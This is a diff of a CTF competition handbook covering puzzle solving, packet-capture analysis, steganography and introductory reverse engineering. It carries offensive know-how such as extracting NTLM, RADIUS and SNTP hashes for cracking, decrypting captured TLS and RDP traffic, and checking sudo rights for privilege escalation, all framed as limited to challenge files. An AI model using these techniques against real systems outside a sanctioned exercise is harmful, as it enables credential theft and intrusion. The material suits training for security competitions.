+    for dr, dc in [(1, 0), (-1, 0), (0, 1), (0, -1)]:
+        nr, nc = r+dr, c+dc
+        if not (0 <= nr < len(grid) and 0 <= nc < len(grid[0])):
+            continue
+        if grid[nr][nc] == '#' or (nr, nc) in previous:
+            continue
+        previous[(nr, nc)] = (r, c)
+        queue.append((nr, nc))
+assert goal in previous
+path = []
+current = goal
+while current is not None:
+    path.append(current)
+    current = previous[current]
+path.reverse()
+assert len(path)-1 == 5
+assert all(abs(a[0]-b[0])+abs(a[1]-b[1]) == 1 for a, b in zip(path, path[1:]))
+print(path)
+```
+
+For image mazes, first derive a stable grid from cell centers. Anti-aliased edges, moving sprites, and coordinate scaling can corrupt wall detection. If a move depends on inventory or switches, include them in the BFS state; position alone is insufficient.
+
+<a id="11-miscellaneous--recurrences-and-number-representation"></a>
+
+### Recurrences and number representation
+
+For a recurrence puzzle, compute a dozen terms locally, compare all supplied examples, then use dynamic programming or matrix exponentiation. Do not upload the challenge sequence to an online lookup service. OEIS-style automated online searching from the original source is excluded here.
+
+JavaScript integers lose exactness above `2^53-1`. **Kali only**, with listed Node.js:
+
+```javascript
+// Save as precision-demo.js; run: node precision-demo.js
+const x = 2 ** 53;
+console.log(x === x + 1); // true
+console.log(BigInt(x) === BigInt(x) + 1n); // false
+```
+
+A challenge must actually use floating-point number semantics for this to matter. JSON-to-integer conversion in another language may reject or preserve the value differently.
+
+De Bruijn sequences cover all fixed-length substrings efficiently, but cyclic versus linear output changes the required suffix. The 100-prisoners strategy follows permutation cycles; it does not guarantee success for an arbitrary instance. Fifteen-puzzle solvability depends on inversion parity and blank-row convention, so verify with a solved board before decoding bits.
+
+<a id="11-miscellaneous--12-constraint-solving-and-esoteric-languages"></a>
+
+## 12. Constraint solving and esoteric languages
+
+Write constraints in the original domain. For bytes, constrain `0..255`; for fixed-width arithmetic, preserve wrapping and signedness. Add a second-solution check to learn whether the model is unique.
+
+Without an SMT dependency, small domains can be enumerated exactly. Save as `constraints_toy.py`:
+
+```python
+solutions = [(x, y) for x in range(10) for y in range(10)
+             if x+y == 11 and 3*x-y == 9]
+assert solutions == [(5, 6)]
+print(solutions[0])
+```
+
+For a provisioned `z3` library, model the same constraints first and verify its solution with ordinary Python. A SAT result is not a flag until it passes the challenge checker. YARA-derived conditions, Boolean circuits, nonograms, and type constraints may each need different domain choices.
+
+Brainfuck requires a tape size policy, cell width, EOF behavior, and matched bracket map. Instrument each opcode and bound the step count before running unknown code. Whitespace languages treat spaces, tabs, and newlines as syntax; do not strip them. Piet requires image color transitions and direction state; an image viewer alone does not execute it.
+
+Verilog/HDL puzzles require combinational versus sequential semantics, bit widths, signedness, and clock/reset behavior. If an unlisted simulator is required, manually translate a small circuit into a local Boolean model or use the provided approved environment; do not use an online HDL compiler.
+
+<a id="11-miscellaneous--13-dns-and-protocol-puzzles"></a>
+
+## 13. DNS and protocol puzzles
+
+Use the organizer-provided resolver or packet capture, not public infrastructure. DNS round-robin responses may reveal a set over repeated queries, but caching, TTL, and load balancing affect observations. A DNS maze needs a visited set and an explicit next-label rule.
+
+For DNSSEC NSEC walking, inspect predecessor/successor names and whether the zone uses NSEC or NSEC3. An IXFR request differs from AXFR and requires the proper serial framing. EDNS Client Subnet affects resolver behavior only when the server honors it; it is not a universal source-address spoof.
+
+When DNS carries encoded data, use transaction IDs, sequence fields, timestamps, and domain labels to reconstruct order. Remove the fixed suffix before decoding. Do not send challenge secrets through public DNS as a recovery method.
+
+DNS rebinding is a timing and resolution disagreement; capture both validation and fetch phases. A hostname resolving twice to the same address is a failed experiment, not proof that the application is safe.
+
+<a id="11-miscellaneous--14-challenge-scoped-privilege-puzzles"></a>
+
+## 14. Challenge-scoped privilege puzzles
+
+These source topics apply only when the challenge explicitly gives you a shell or local service and makes privilege escalation part of the objective. Run checks inside that challenge, never on the competition workstation:
+
+```bash
+id
+pwd
+sudo -l
+```
+
+Read the exact allowed program and argument constraints. Wildcards can match path separators depending on the matching function; a symlink can change what a later privileged open sees. Confirm ownership and permissions of the specific file involved. Do not modify `/etc/sudoers` or host service configuration merely to prove a theory.
+
+SUID file readers, backup jobs, writable script paths, database program execution, print deployment services, and monitoring-agent arguments are separate primitives. Start with the supplied service's normal behavior and a harmless marker. The end goal is the designated challenge file, not persistence or workstation control.
+
+Docker socket, privileged containers, BuildKit secrets, Kubernetes tokens, NFS, and internal proxies require explicit inclusion in the challenge topology. A token found in a challenge does not authorize unrelated infrastructure. For a permitted local puzzle, determine the token's actual namespace/role or socket permissions before choosing an action.
+
+Historical polkit overflows, seccomp high-bit descriptor mistakes, editor escapes, and WinSSHTerm credential formats are version-specific. Use the supplied binary/configuration and approved reverse-engineering tools to verify the failing check. Source writeup commands are not portable proof.
+
+<a id="11-miscellaneous--15-portal-workflow-and-a-useful-handoff"></a>
+
+## 15. Portal workflow and a useful handoff
+
+Use the organizer's normal browser interface to read descriptions, download attachments, start instances, request hints, and submit flags. A CTFd-looking theme does not prove its API or authentication behavior. Hints can cost points; read the displayed consequence before purchasing.
+
+If the organizer explicitly documents an API for competitors, use its token and endpoint format as supplied. Keep the token out of notes and logs. Do not scrape hidden challenges, attack the scoring platform, or automate repeated submissions because an old repository script can do so.
+
+Record each solve as input artifact/hash, interpretation, exact transformation or script, expected output, final flag, and remaining assumptions. If a QR, audio, game, or jail solution depends on manual transcription, save that intermediate representation so a teammate can reproduce it.
+
+The 14 source files in `ctf-misc/` are merged here: overview; encodings and advanced formats; audio and RF; Python/Bash jails; games/VMs parts 1–4; DNS; CTFd navigation; and Linux privilege puzzles. Overlapping network, media, crypto, and reverse-engineering details are cross-category material rather than new official event categories.
+
+
+---
+
 <a id="04-network"></a>
+
+<a id="04-network--network-captures-and-hardware-signals"></a>
 
 # Network captures and hardware signals
 
+**Quick route:** [Short commands](#quickstart--network-conversation) · [Tool strengths and weaknesses](#tool-chooser--network). Use this chapter for deeper explanations.
+
 Start by identifying the conversation, direction, and transport framing. Then recover application bytes. Most failed network solves come from decoding packet fragments as if they were already a complete file.
+
+<a id="04-network--machine-and-scope"></a>
 
 ## Machine and scope
 
@@ -1463,6 +4690,8 @@ New-Item -ItemType Directory -Force out | Out-Null
 ```
 
 `capture.pcapng` is your supplied capture. Record endpoints, byte-heavy flows, unusual protocols, and interface IDs. A protocol label is a dissector's interpretation; TLS on port 443 can still be a fake label over custom bytes.
+
+<a id="04-network--read-filters-correctly"></a>
 
 ## Read filters correctly
 
@@ -1486,6 +4715,8 @@ tcpdump -nn -A -r capture.pcap 'tcp port 80'
 ```
 
 Disabling name resolution avoids unexpected external lookups. A SYN-ACK suggests a responding TCP listener, not the identity or version of its application. In Wireshark, disable network name resolution when reviewing unknown addresses.
+
+<a id="04-network--http-credentials-and-files"></a>
 
 ## HTTP, credentials, and files
 
@@ -1525,6 +4756,8 @@ for i, part in enumerate(message.iter_parts()):
 
 Inspect HTML/XML/JSON exports for application names, version hints, usernames, and configuration files. A captured shell stream may show `.env`, `wp-config.php`, or database passwords. Those are evidence; do not test them outside the challenge. For email, preserve the full headers, MIME boundaries, and transfer encoding; decode each attachment individually with Python's `email` parser.
 
+<a id="04-network--tcp-reassembly-is-not-hex-concatenation"></a>
+
 ## TCP reassembly is not hex concatenation
 
 Concatenating every `tcp.payload` duplicates retransmissions, interleaves both directions, and ignores gaps. Prefer Wireshark's Follow Stream reassembly. To investigate failures, export sequence metadata:
@@ -1553,6 +4786,8 @@ with open('out/reassembled.bin', 'xb') as dst:
 
 Validate the resulting archive with an approved archive tool. Uniform-size pieces and one short piece suggest splitting but do not prove order.
 
+<a id="04-network--tls-and-rdp-use-the-right-key-material"></a>
+
 ## TLS and RDP: use the right key material
 
 **Windows TShark**, supplied NSS keylog file:
@@ -1575,6 +4810,8 @@ openssl x509 -in certificate.der -inform DER -noout -text
 Set the RSA-key list's IP, port, application protocol, and PEM path in Wireshark. For RDP, the application may be `tpkt`. A PFX appearing in a capture does not automatically make all RDP sessions decryptable.
 
 For a core-dump secret search, locate handshake randoms or session IDs in the dump, then use the **exact TLS-library version's structure layout** to identify candidate secret buffers. The historical rule “48 bytes immediately before the session ID” is not portable. Validate a candidate by successfully decrypting/authenticating records, not by its length. Use locally supported crypto methods for weak-key challenges; do not send moduli or captures to public analysis services.
+
+<a id="04-network--authentication-evidence-ntlm-smb-radius-sntp"></a>
 
 ## Authentication evidence: NTLM, SMB, RADIUS, SNTP
 
@@ -1625,6 +4862,8 @@ Path('out/sntp.hashes').write_text('\n'.join(sorted(records)) + '\n')
 
 For RADIUS, locate the installed John jumbo `radius2john` extractor (Kali row 80), inspect its help, and use its output with John. Apply a recovered shared secret in Wireshark's RADIUS preferences; verify corresponding requests/responses. Do not treat every UDP/1812 packet as a usable crackable exchange.
 
+<a id="04-network--dns-and-icmp-covert-channels"></a>
+
 ## DNS and ICMP covert channels
 
 **Windows PowerShell:** export one direction and keep packet order.
@@ -1667,6 +4906,8 @@ For dnscat-like traffic, parse message type, session, sequence, and acknowledgem
 For trailing DNS bits, walk DNS labels (including compression pointers) and the question's QTYPE/QCLASS. A raw `len(qname)` calculation is not a general wire-length parser. Compare the dissector's byte selection with the UDP payload to find the unexplained tail.
 
 For ICMP, test payload lengths, identifier/sequence values, byte rotations, and timing separately. IPv4 payload length is total IP length minus actual IP-header length minus the eight-byte echo header; do not use Ethernet frame length. Exclude replies when requests alone carry data. Preserve leading zero bytes when packing bits.
+
+<a id="04-network--timing-and-flag-channels"></a>
 
 ## Timing and flag channels
 
@@ -1712,6 +4953,8 @@ print(base64.b64decode(encoded + '=' * (-len(encoded) % 4), validate=True))
 
 Also inspect BCD: both nibbles must be decimal digits. Pair or triple the resulting digits according to explicit framing; greedy two/three-digit ASCII decoding can produce ambiguous results.
 
+<a id="04-network--wi-fi-voice-and-secondary-protocols"></a>
+
 ## Wi-Fi, voice, and secondary protocols
 
 **Kali**, supplied wireless capture only:
@@ -1729,6 +4972,8 @@ For RTP, use Wireshark **Telephony → RTP → RTP Streams**, inspect codec and 
 For USB audio, isolate one isochronous endpoint/direction and export `usb.iso.data` if available in the installed dissector. Use descriptor-declared channels, sample width, signedness, and rate when importing raw PCM in approved Kali Audacity (row 17). Remove USB framing, not arbitrary leading bytes.
 
 For 5G NAS/RLC/PDCP/MAC records or SAP traffic, inspect **Analyze → Enabled Protocols** and **Decode As** for installed dissectors. Capture encapsulation and direction affect parsing. SMS user-data headers can contain animation or ringtone data, but those bytes need the declared data-coding scheme. The historical SAP-specific external tools are not assumed approved.
+
+<a id="04-network--usb-keyboard-reports"></a>
 
 ## USB keyboard reports
 
@@ -1780,6 +5025,8 @@ For arrows (`4f` right, `50` left, `51` down, `52` up), maintain a line/column c
 
 Linux `input_event` dumps use a different keycode set. A common 64-bit little-endian record is `struct.unpack('<qqHHi', record)` over 24 bytes: seconds, microseconds, type, code, value. A 32-bit timeval layout can be 16 bytes (`<iiHHi`). Validate timestamp ranges and record alignment before choosing. For `type==1`, value 1 is press, 0 release, and 2 repeat; map codes using the matching supplied/Linux input-event header, not the USB HID map.
 
+<a id="04-network--mouse-leds-bluetooth-and-midi"></a>
+
 ## Mouse, LEDs, Bluetooth, and MIDI
 
 Mouse reports need signed delta fields from the descriptor. Accumulate motion even while the button is up, but draw a segment only while the pen/button is down. Keep custom drawing modes separate; connecting separate strokes creates false letters. Render with a WSL Python SVG writer or Pillow (Windows row 14).
@@ -1789,6 +5036,8 @@ For keyboard LEDs, isolate host-to-device `SET_REPORT`, decode the appropriate o
 Bluetooth RFCOMM sits above L2CAP. Export dissector payloads for one channel; do not strip a fixed eight-byte header from every packet. Reassemble application frames from their own lengths and group/order fields. For USB MIDI, strip the USB-MIDI event packet header, then parse MIDI messages: Note On with velocity zero is Note Off. On a verified Launchpad mapping, `row=note//16`, `column=note%16`; save the accumulated grid before clearing at a separator. Different models use different note layouts.
 
 For console framebuffer transfers, recover all blocks by their destination memory offsets before rendering. GBA native color is commonly 15-bit BGR555 in 16-bit words, while adapters may convert it to RGB565: determine the format from the actual protocol. Dimensions and a visually plausible image alone do not validate byte order.
+
+<a id="04-network--uart-and-synchronous-logic-captures"></a>
 
 ## UART and synchronous logic captures
 
@@ -1847,6 +5096,8 @@ def tmds_video(symbol):
 
 For DisplayPort, first establish lane alignment and valid 8b/10b control symbols/running disparity, then apply the specified scrambler bit order and reset behavior. Transport-unit size and stuffing are negotiated; do not assume “60 data bytes plus four overhead” for every stream. A supplied encoder is the most useful reference for a custom signal challenge.
 
+<a id="04-network--corruption-and-compression-troubleshooting"></a>
+
 ## Corruption and compression troubleshooting
 
 For a classic PCAP, inspect its 24-byte global header, endian/nanosecond magic, link type, and every record's included/original length. For pcapng, use block lengths, section endian marker, and interface link types; it has a different format. Change only fields supported by surrounding evidence, then reopen the copy. The source's `pcapfix` installer is not an approved default.
@@ -1862,9 +5113,15 @@ Source material adapted: `ctf-forensics/network.md`, `network-advanced.md`, `per
 
 <a id="05-steganography"></a>
 
+<a id="05-steganography--steganography-documents-and-media"></a>
+
 # Steganography, documents, and media
 
+**Quick route:** [Short commands](#quickstart--png-trailer) · [Tool strengths and weaknesses](#tool-chooser--steganography-and-audio). Use this chapter for deeper explanations.
+
 Treat each file as a container before treating it as pixels or sound. Read metadata, inspect structural boundaries, enumerate frames/tracks, then test a specific hiding hypothesis. Keep every recovered layer and its extraction settings.
+
+<a id="05-steganography--tools-and-execution-environment"></a>
 
 ## Tools and execution environment
 
@@ -1874,9 +5131,11 @@ Treat each file as a container before treating it as pixels or sound. Read metad
 | Windows WSL | Python 3, strings, zsteg, binwalk, ExifTool, pdftotext, ZBar, qpdf, xxd | Windows 14, 18–22, 26, 33, 35 |
 | Kali | Audacity, FFmpeg, ImageMagick, pngcheck, SoX, Sonic Visualiser, steghide, stegseek, stegsnow, StegSolve | Kali 17, 47, 74, 115, 136, 135, 141–144 |
 
-Python examples run in **WSL**; Pillow, NumPy, SciPy, and other non-AI libraries fall under Windows row 14. Check availability before choosing a recipe; do not install a toolkit wholesale. Python permission does not override the explicit unapproved list. In particular, do not use ML classifiers, unapproved DCT-Image-Steganography, sigBits, or magiceye-solver (Unapproved rows 17, 75, 42).
+Python examples run in **WSL**. Non-AI libraries such as Pillow, NumPy and SciPy may be added under PDF p.5; use [targeted package setup](#00-tool-rules--non-ai-python-package-checks). Keep named exclusions: ML classifiers, DCT-Image-Steganography, sigBits and magiceye-solver are outside this guide's practical routes (Unapproved rows 17, 75, 42).
 
 Keep decoding local. Online image/barcode readers and public analysis uploads are not a substitute for missing tools under the [event rules](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/).
+
+<a id="05-steganography--first-five-minutes"></a>
 
 ## First five minutes
 
@@ -1909,6 +5168,8 @@ stegseek carrier.jpg challenge-words.txt recovered-from-wordlist.bin
 ```
 
 Enter a clue-derived password at the steghide prompt; an empty password is a reasonable single test if the clue gives none. `challenge-words.txt` is a small local list built from evidence. A failed password does not prove absence of embedded data. Inspect the extracted format and contents before continuing to another layer.
+
+<a id="05-steganography--png-chunks-trailers-and-safe-repairs"></a>
 
 ## PNG chunks, trailers, and safe repairs
 
@@ -1944,6 +5205,8 @@ else:
     raise ValueError('no complete IEND')
 ```
 
+Inspect the saved trailer in WSL with `xxd -l 128 png-parts/trailer.bin` and `strings -a png-parts/trailer.bin`. Or use the [short PNG card](#quickstart--png-trailer), whose helper prints a preview automatically.
+
 Check `tEXt`, `iTXt`, `zTXt`, unknown chunks, unused palette data, and bytes after IEND. If an archive signature is overwritten, repair only a copy after verifying the rest of its header. For chunk-case corruption, change the **chunk type field**, then recompute its CRC over type+data. Global byte replacement can corrupt an IDAT stream.
 
 IHDR must be first, IEND last, and IDAT chunks consecutive. PLTE/tRNS and other ancillary chunks have specific ordering requirements: do not move every ancillary chunk before IDAT indiscriminately. Preserve IDAT ordering unless a separate clue defines a permutation.
@@ -1968,6 +5231,8 @@ else:
 ```
 
 After repair, verify decoding and expected decompressed scanline length. A matching CRC is not permission to claim arbitrary new rows exist.
+
+<a id="05-steganography--bitplanes-and-packed-messages"></a>
 
 ## Bitplanes and packed messages
 
@@ -2020,6 +5285,8 @@ print(repr(data))
 
 Use thresholding only for visibly black/white carriers. Lossy images may need a measured threshold; color LSB extraction from JPEG-decoded pixels is usually unstable.
 
+<a id="05-steganography--palettes-quantization-tables-and-pixel-paths"></a>
+
 ## Palettes, quantization tables, and pixel paths
 
 Unused PNG palette entries can hold bytes without affecting visible pixels. **WSL:**
@@ -2063,6 +5330,8 @@ print(repr(out))
 ```
 
 For seeded permutations, reproduce the exact generator, shuffle algorithm, seed, traversal order, and channel conversion. NumPy `RandomState` and `default_rng` produce different permutations. Extract multiple bitplanes in the order specified by the encoder, then test the result's framing/checksum.
+
+<a id="05-steganography--qr-reconstruction-and-geometric-transforms"></a>
 
 ## QR reconstruction and geometric transforms
 
@@ -2132,6 +5401,8 @@ Measure any rings/peak grids before sampling bits; choose radii, angular order, 
 
 If equal plaintext pixels were replaced with equal ciphertext tokens, preserve token equality and render each distinct token as a different color to reveal shapes. A 256-entry hash-to-pixel lookup works only for a known **unkeyed hash** of single-byte grayscale values; it does not decrypt arbitrary keyed AES. For Angecryption clues, use the supplied/recovered cipher/key/IV and test full format validity in both directions; two valid images alone do not prove a relationship.
 
+<a id="05-steganography--pdf-svg-and-office-documents"></a>
+
 ## PDF, SVG, and office documents
 
 **WSL** tools, Windows rows 21, 22, 33:
@@ -2163,6 +5434,8 @@ For SVG, read it as XML/text before opening active content. Inspect `<animate>` 
 
 For XLSX numeric carriers, export cells to CSV using approved Kali LibreOffice (row 88), keeping row/column order. Reimplement any macro's arithmetic without enabling it. Frequency-ranked values are only a hypothesis: tied frequencies make ordering ambiguous. Check all candidate mappings against file signatures rather than assuming 256 distinct values imply a correct byte map.
 
+<a id="05-steganography--text-terminal-and-archive-channels"></a>
+
 ## Text, terminal, and archive channels
 
 View suspicious terminal captures as bytes before displaying their escape sequences. ANSI can move the cursor and overwrite text; stripping CSI codes recovers underlying text but does not simulate the final screen.
@@ -2187,6 +5460,8 @@ Only treat spaces/tabs as a bitstream if the challenge supports that interpretat
 Kitty graphics begins with `ESC _ G` and ends with `ESC \`. Parse command headers, group chunks by image/transfer ID, and join base64 payloads until `m=0`. Respect `f=24` RGB versus `f=32` RGBA, dimensions `s`/`v`, and optional zlib compression `o=z`; PNG format `f=100` is already an encoded image. Validate decoded byte length before rendering. Joining every Kitty sequence can merge different images incorrectly.
 
 For interleaved files, save `data[0::2]` and `data[1::2]`, identify both, then inspect alternating scanlines if the decoded images are striped. Try full byte reversal only when the other end has a meaningful reversed header. Nested PNG XOR carriers need per-layer keys and chunk CRC validation, not one global key. GZSteg/SpamMimic-specific external decoders from the source are not available defaults; inspect supplied encoder code and retain the unmodified gzip stream for any format-level investigation.
+
+<a id="05-steganography--audio-hear-inspect-and-preserve-samples"></a>
 
 ## Audio: hear, inspect, and preserve samples
 
@@ -2247,6 +5522,8 @@ for ch in range(channels):
 
 The bit order within each sample is a hypothesis; try its reverse if warranted. For eight-bit PCM, use unsigned samples. Inspect channel-interleaved and separate-channel layouts deliberately.
 
+<a id="05-steganography--sstv-analog-image-lines-and-signal-caveats"></a>
+
 ## SSTV, analog image lines, and signal caveats
 
 **Kali row 140** calls its tool `sstv` but records installation as `pip (PySSTV)`. PySSTV is commonly an encoder package; that row does **not** prove a working decoder exists. Inspect the installed command/help before promising a decode. MMSSTV and RX-SSTV are unapproved (rows 46/69); do not replace a missing decoder with a public upload service.
@@ -2271,6 +5548,8 @@ Band-limit around the known carrier before phase estimation if needed. Edge tran
 For Voyager-style amplitude images, detect separated sync pulses, measure consecutive line intervals, resample each interval to equal width, normalize globally, then try orientation/transposition. Validate against any supplied calibration image. For RF `.sub` files, `RAW_Data` normally contains signed pulse durations; cluster pulse/gap widths according to the protocol rather than discarding bytes ≥128 as “noise.”
 
 DeepSound-like WAVs: the approved John jumbo installation may include `deepsound2john.py`; inspect its help and use it to confirm a format-specific hash before cracking. A recovered password is not an extraction implementation. DeepSound GUI is not separately approved; use a supplied encoder/format description or a permitted local non-AI implementation, and validate output length/checksums.
+
+<a id="05-steganography--video-animation-and-temporal-channels"></a>
 
 ## Video, animation, and temporal channels
 
@@ -2314,6 +5593,8 @@ For blinking LEDs, crop a small stable region, compute brightness per frame, thr
 
 For MJPEG, inspect the container's frame boundaries and JPEG markers; preserve bytes after each true EOI before the next frame. Naively splitting at every `FFD8` can encounter thumbnails or unrelated bytes. For JPEG XL progressive ordering, a full decode hides the order channel. The source's `djxl` is not listed: if the approved ImageMagick build supports JXL, inspect its format support and whether partial decodes are usable; otherwise retain TOC analysis as a format-reading task, without installing a missing decoder. Do not reuse a stale output image after a failed partial decode.
 
+<a id="05-steganography--printing-punched-cards-and-optical-media"></a>
+
 ## Printing, punched cards, and optical media
 
 Binary G-code starts `GCDE`; read version and checksum type before walking blocks. Each block has type, compression, lengths, and type-specific fields. A checksum is not always an unconditional four bytes. Heatshrink parameters and G-code text encodings depend on the format version; a decompressed block can still need decoding. WSL non-AI `heatshrink2` is permitted by Windows row 14 when needed, but validate output against declared length. `qoif` thumbnails contain big-endian width/height and RGB/RGBA channel metadata.
@@ -2351,6 +5632,8 @@ Punched cards: calibrate the 80-column ×12-row grid, label rows `12,11,0,1,…,
 
 CDDA with only two dominant byte values can encode a disc image rather than normal audio. A specialized encoder may pre-interleave bytes to compensate for CIRC; this is not a general raw-audio decoder. Use the supplied calibration pair to establish the 24-byte channel permutation/delays, then render polar rings with increasing bytes-per-revolution. Tune initial circumference and radial increment against calibration before decoding the unknown file. Preserve sample order; assuming every `.cdda` uses one historical tool's constants produces plausible but wrong images.
 
+<a id="05-steganography--statistical-traces-without-ai"></a>
+
 ## Statistical traces without AI
 
 For power traces, determine axes from the challenge data description. Average repeated measurements, inspect per-sample variance, and compare hypotheses using an explicit leakage model. “Largest power is the correct digit” is only valid for a challenge whose implementation has that behavior. Report stability across separate trace subsets rather than one maximum.
@@ -2362,1166 +5645,19 @@ Source material adapted: `ctf-forensics/steganography.md`, `stego-image.md`, `st
 
 ---
 
-<a id="06-reverse-engineering"></a>
-
-# Reverse engineering: turn a program into a checkable explanation
-
-Your first deliverable is a sentence such as “the program XORs each input byte with a repeating key, rotates it, and compares the result with this table.” Once that sentence is accurate, writing a solver is usually straightforward. A decompiler's output is a hypothesis; the bytes and a repeatable run are the evidence.
-
-This chapter is for human, local analysis of supplied challenge files. The event prohibits AI assistance and public online analysis, decompilation, and compilation services. Use the handbook as preparation or as an offline reference only where the event permits it. Do not upload binaries to a comparison site. Work only on the challenge targets assigned to your team.
-
-## 1. Choose the correct machine before choosing a command
-
-The workbook describes two separate environments. A tool listed under Windows with installation location WSL is not a Windows executable and is not automatically available in Kali.
-
-| Route | Approved tools relevant here | Practical use |
-| --- | --- | --- |
-| **Windows native** | x64dbg (Windows row 40), HxD (42), Notepad++ (44), dnSpyEx (45) | PE debugging, byte inspection, managed .NET analysis |
-| **Windows WSL** | Python 3 (14), GDB (16), objdump (17), strings (18), Ghidra (29), llvm-mc (34), xxd (35) | ELF analysis, local decompilation, small scripts |
-| **Kali** | radare2 (123), Frida (53), angr (13), GCC/build tools (54), ltrace (90), strace (145), UPX (156), jadx (79), Apktool (15) | ELF triage, instrumentation, APK extraction, local practice builds |
-| **Kali, specialized** | GoReSym (62), pycdc (117), pyinstxtractor-ng (118), uncompyle6 (152), unpyc3 (153), Cutter (31), BinDiff (19) | Language and packaging specific follow-up |
-
-Kali tools were installed on a best-effort basis; operation is not guaranteed. Python 3.11's Kali row 121 records no installation information. Check the interpreter actually present before running a Python example. Windows WSL Python is the reliable workbook-backed route for the standard-library scripts below.
-
-**Windows native, PowerShell: enter the supplied WSL distribution.**
-
-```powershell
-wsl --list --verbose
-wsl
-```
-
-**Windows WSL, Bash: check the listed tools without installing anything.**
-
-```bash
-command -v python3 gdb objdump strings xxd
-python3 --version
-gdb --version
-```
-
-**Kali, Bash: check the separate tool set.**
-
-```bash
-command -v r2 rabin2 python3 frida strace ltrace gcc
-r2 -v
-python3 --version
-```
-
-If a command is missing, use a listed alternative or the other supplied environment. Do not run the source repository's blanket installation commands. Windows row 14 permits additional non-AI Python libraries; that is permission to add a library, not evidence it is already installed, and does not approve unrelated standalone software. This chapter's core route needs no additional Python package.
-
-IDA Free and Binary Ninja Free are in the unapproved sheet. MCP servers and AI plugins are out of scope. WinDbg, Scylla/x64dbg plugins, de4dot, online decompilers, and online analysis services are also excluded by the workbook. The approved x64dbg application does not imply approval of every extension.
-
-## 2. Preserve the file and identify its format
-
-Use `chall` below for a local challenge file placed in your working directory. Keep the original untouched; make a separate copy before patching. Record its hash, format, architecture, input channel, and your first observed output.
-
-**Windows native, PowerShell:**
-
-```powershell
-Get-FileHash -Algorithm SHA256 -LiteralPath .\chall
-Copy-Item -LiteralPath .\chall -Destination .\chall.work
-Format-Hex -Path .\chall
-```
-
-**Windows WSL, Python standard library:**
-
-```bash
-python3 - <<'PY'
-from pathlib import Path
-import hashlib
-p = Path('chall')
-data = p.read_bytes()
-print('size:', len(data))
-print('sha256:', hashlib.sha256(data).hexdigest())
-print('first 32 bytes:', data[:32].hex(' '))
-PY
-```
-
-Interpret the header before running it: `7f 45 4c 46` is ELF; `4d 5a` begins a DOS/PE family file; `00 61 73 6d` is WebAssembly; ZIP containers start with `50 4b` and may be APK, JAR, HAP, or an ordinary archive. A file extension alone proves none of these. An `MZ` stub may itself contain the challenge, so do not automatically discard it.
-
-**Windows WSL:**
-
-```bash
-objdump -f chall
-objdump -x chall > headers.txt
-strings -a -t x chall > strings.txt
-python3 - <<'PY'
-from pathlib import Path
-for line in Path('strings.txt').read_text(errors='replace').splitlines():
-    if any(word in line.lower() for word in ('flag', 'correct', 'wrong', 'password', 'usage')):
-        print(line)
-PY
-```
-
-**Kali:**
-
-```bash
-file chall
-rabin2 -I chall
-rabin2 -S chall
-rabin2 -zz chall > strings.txt
-rg -in 'flag|correct|wrong|password|usage' strings.txt
-```
-
-Save full output; a filtered display is an index into it. No matching string means only that this search found none. Packed data, wide strings, runtime decoding, and a different flag format can all hide a useful string. `rabin2 -zz` reports physical and virtual addresses: a file offset is not a runtime address.
-
-| Observation | Next action | Why |
-| --- | --- | --- |
-| Plaintext candidate flag | Find references and test the candidate against the original | A decoy string is cheap to plant |
-| `strcmp`/`memcmp` imported | Find callers, then stop before the relevant call | Comparison arguments may reveal the actual check |
-| Few imports and high-entropy sections | Inspect entry point, memory allocation and writes | A loader may create the real code at runtime |
-| ELF sections rejected but program headers sensible | Inspect load segments; analyze a repaired copy only | The loader uses segments; corrupt sections can mislead tools |
-| Native architecture does not match the host | Continue statically | A foreign ELF cannot run merely because it is executable |
-| .NET metadata / CLR header | Open in native dnSpyEx | Managed methods are more informative than native startup stubs |
-
-## 3. A complete small checker to practice on
-
-This local toy accepts four bytes on standard input. It gives you a known reference for practicing strings, cross-references, decompilation, and comparison breakpoints. Save as `checker.c` using an approved editor.
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-int main(void) {
-    unsigned char input[32] = {0};
-    const unsigned char key[] = {0x31, 0x72};
-    const unsigned char expected[] = {0x61, 0x3f, 0x72, 0x3f};
-    unsigned char out[4];
-    if (!fgets((char *)input, sizeof input, stdin)) return 2;
-    size_t n = strcspn((char *)input, "\r\n");
-    if (n != 4) { puts("wrong length"); return 1; }
-    for (size_t i = 0; i < 4; i++)
-        out[i] = (unsigned char)((input[i] ^ key[i % 2]) + i);
-    if (memcmp(out, expected, 4) == 0) puts("correct");
-    else puts("wrong");
-    return 0;
-}
-```
-
-**Kali, approved GCC; local practice only:**
-
-```bash
-gcc -O0 -g -fno-builtin -o checker checker.c
-printf 'AAAA\n' | ./checker
-printf 'PLAN\n' | ./checker
-```
-
-Expected output is `wrong`, then `correct`. This compiler command is not asserted available in Windows WSL. A compiled Linux file may be inspected statically there; execution also requires a compatible loader and libc.
-
-**Windows WSL Python, or Kali with Python confirmed:**
-
-```bash
-python3 - <<'PY'
-key = bytes([0x31, 0x72])
-expected = bytes([0x61, 0x3f, 0x72, 0x3f])
-answer = bytes(((b - i) & 0xff) ^ key[i % len(key)]
-               for i, b in enumerate(expected))
-reencoded = bytes(((b ^ key[i % len(key)]) + i) & 0xff
-                  for i, b in enumerate(answer))
-assert reencoded == expected
-print(answer.decode('ascii'))
-PY
-```
-
-The output is `PLAN`. Subtraction must happen before XOR because the checker applies XOR before addition. The round-trip assertion tests the inversion, while running the original checks the input length, newline handling, and surrounding logic.
-
-## 4. Follow a check with radare2 on Kali
-
-The following is an interactive **Kali radare2** session. `checker` is the toy above; for a real target, substitute its filename and use the names or addresses actually printed by the tool.
-
-```text
-r2 checker
-aaa
-iI
-ii
-izz~correct
-afl
-pdf @ main
-```
-
-`aaa` performs analysis; `afl` lists recognized functions; `pdf` disassembles a function. Find the call to `memcmp` and the conditional branch after it. `test eax,eax` followed by a zero/nonzero branch commonly checks a C comparison result. Follow both destinations and identify which prints `correct`. The presence of one apparent success branch does not establish that it is the final check.
-
-**Kali radare2, continue in the same session:**
-
-```text
-axt @ sym.imp.memcmp
-pdf @ main
-agf @ main
-q
-```
-
-`axt` lists incoming references; `agf` shows a function graph. If your imported name differs, copy its exact flag from `ii`. If `main` is absent, use `ie` for entry points, `afl` for candidates, and inspect the startup routine's call target. A stripped executable has fewer names, not less machine code.
-
-For a string reference, copy the **virtual address** from `izz`, then use `axt @ ADDRESS`, replacing `ADDRESS` with that number. Use `pdf @ FUNCTION` for the containing function. The placeholder is deliberately not a universal address.
-
-**Kali, save reusable static output:**
-
-```bash
-r2 -q -c 'aaa;aflj' checker > functions.json
-r2 -q -c 'aaa;pdf @ main' checker > main.asm
